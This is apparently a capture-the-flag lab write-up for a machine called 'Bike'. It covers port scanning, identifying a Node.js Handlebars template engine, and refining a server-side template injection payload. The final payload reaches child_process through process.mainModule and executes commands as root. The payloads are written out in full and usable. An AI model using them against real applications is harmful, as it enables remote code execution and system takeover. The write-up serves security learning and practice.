
`sudo nmap -vvv -Pn -sC -sCV --reason -T4 -p0-65535 10.129.97.64`

```
PORT   STATE SERVICE    REASON         VERSION
22/tcp open  ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  tcpwrapped syn-ack ttl 63
|_http-title:  Bike 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne
```



Wapallyzer shows the server is running on express framework using node.js

`{{7*7}}` throws and error telling us the template engine is handlebars 

```
Error: Parse error on line 1:  
{{7*7}}  
--^  
Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'  
    at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)  
    at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30)  
    at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)
    at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)
at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)  
    at router.post (/root/Backend/routes/handlers.js:14:16)  
    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)  
    at next (/root/Backend/node_modules/express/lib/router/route.js:137:13)  
    at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3)  
    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)
```

Finding the handlebars payload from hacktricks we see that `require` is not defined 

[Payload](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#handlebars-nodejs) ```
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D```

This returns the error that require is not defined. require is a keyword in Javascript and more
specifically Node.js . We cannot directly use require because template engines are often sandboxed

**Globals**: Important concept in this room. They are variables that can be accesses anywhere in the program. https://nodejs.org/api/globals.html Those are the docs for Node.js global variables. Require is not global. 

Think about this like a hacker I should have started to look at what global variables I could have called and stopped using the require() which I did not have access to run via the handlebar template engine sandbox. 

#### Process 
Is a global scope updating our payload to test

```
{{#with "s" as |string|}}
	{{#with "e"}}
		{{#with split as |conslist|}}
			{{this.pop}}
			{{this.push (lookup string.sub "constructor")}}
			{{this.pop}}
			{{#with string.split as |codelist|}}
				{{this.pop}}
				{{this.push "return process;"}}
				{{this.pop}}
				{{#each conslist}}
					{{#with (string.sub.apply 0 codelist)}}
						{{this}}
					{{/with}}
				{{/each}}
			{{/with}}
		{{/with}}
	{{/with}}
{{/with}}
```

We get the return message 

```
We will contact you at: e
2
[object Object]
function Function() { [native code] }
2
[object Object]
[object process]
```

What this means is that we did not error and we can see the object process. Now we need to figure out how to use this to call ac command 
`The `process.mainModule` property provides an alternative way of retrieving [`require.main`](https://nodejs.org/api/modules.html#accessing-the-main-module).`

With this little GEM of knowledge we can update our SSTI payload again. 

```
{{#with "s" as |string|}}
	{{#with "e"}}
		{{#with split as |conslist|}}
			{{this.pop}}
			{{this.push (lookup string.sub "constructor")}}
			{{this.pop}}
			{{#with string.split as |codelist|}}
				{{this.pop}}
				{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
				{{this.pop}}
				{{#each conslist}}
					{{#with (string.sub.apply 0 codelist)}}
						{{this}}
					{{/with}}
				{{/each}}
			{{/with}}
		{{/with}}
	{{/with}}
{{/with}}
```

This command works and shows us we are in as root. From there we can ls/cat our way to the flag by updating the command being sent in our url encoded payload